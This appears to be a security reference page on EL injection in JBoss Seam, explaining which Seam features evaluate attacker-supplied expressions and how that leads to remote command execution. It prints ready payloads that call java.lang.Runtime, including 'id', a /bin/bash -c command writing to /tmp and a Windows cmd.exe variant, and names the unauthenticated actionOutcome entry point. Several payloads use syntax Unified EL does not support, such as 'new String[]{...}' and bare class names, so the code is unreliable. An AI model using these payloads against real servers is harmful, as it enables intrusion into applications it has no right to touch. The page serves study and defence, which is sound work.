---
title: "JBoss Seam EL injection: remote command execution through Unified EL"
description: "Seam evaluates Unified EL expressions, and attacker-controlled EL reaching an interpolated value or a view parameter resolves arbitrary Java, giving command execution in the application server."
keywords:
  - JBoss Seam
  - Seam EL injection
  - Unified EL
  - expression language injection
  - remote command execution
---

# JBoss Seam EL

JBoss Seam builds on Unified Expression Language (`#{...}`), using it far more aggressively than a plain view layer: EL drives navigation, page actions, parameters, and interpolated messages across the framework. Seam also extended EL with parameterized method calls. The security consequence is that any place Seam evaluates an EL string built from untrusted input becomes a path to arbitrary Java, because EL resolution reaches object methods and, through them, the runtime. This is the mechanism behind the well-known Seam remote-command exposure, where an EL expression delivered through a request parameter is evaluated server-side.

## Vulnerable pattern

Seam evaluates EL in several sinks: `actionOutcome` and page-action values, interpolated status and faces messages, and application code that resolves an expression directly:

```java
// value derived from the request
Expression expr = expressions.createValueExpression(input);
Object result = expr.getValue();
```

When `input` carries attacker EL, Seam's resolver walks it against the full application context, including implicit objects Seam exposes.

## Reaching the runtime

EL property and method resolution reaches `java.lang.Runtime`. A single expression obtains the runtime and executes a command:

```
#{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime'))}
```

A cleaner form uses the static `getRuntime()` then `exec`, chaining Seam's method-call support:

```
#{Runtime.getRuntime().exec('id')}
```

Reading output back wraps the returned `Process` stream through EL, constructing a reader/scanner over `getInputStream()` so the command result lands in whatever value Seam renders.

Historically this surface was reached through unauthenticated entry points such as the `actionOutcome` request parameter on Seam's default pages, where the parameter value is taken as an EL outcome and evaluated during navigation, so no application code has to opt in for the expression to run.

## Shell features need an argument vector

`Runtime.exec(String)` tokenizes on whitespace with no shell, so `$(...)`, pipes, and redirection do not expand. For shell behavior, invoke the array overload with an explicit `/bin/bash -c`:

```
#{Runtime.getRuntime().exec(new String[]{'/bin/bash','-c','id > /tmp/o 2>&1'})}
```

On Windows substitute `new String[]{'cmd.exe','/c','whoami'}`.

## References

- [Jakarta Expression Language specification](https://jakarta.ee/specifications/expression-language/)
- [JBoss Seam reference documentation](https://docs.jboss.org/seam/latest/reference/html_single/)
- [OWASP: Expression Language Injection](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
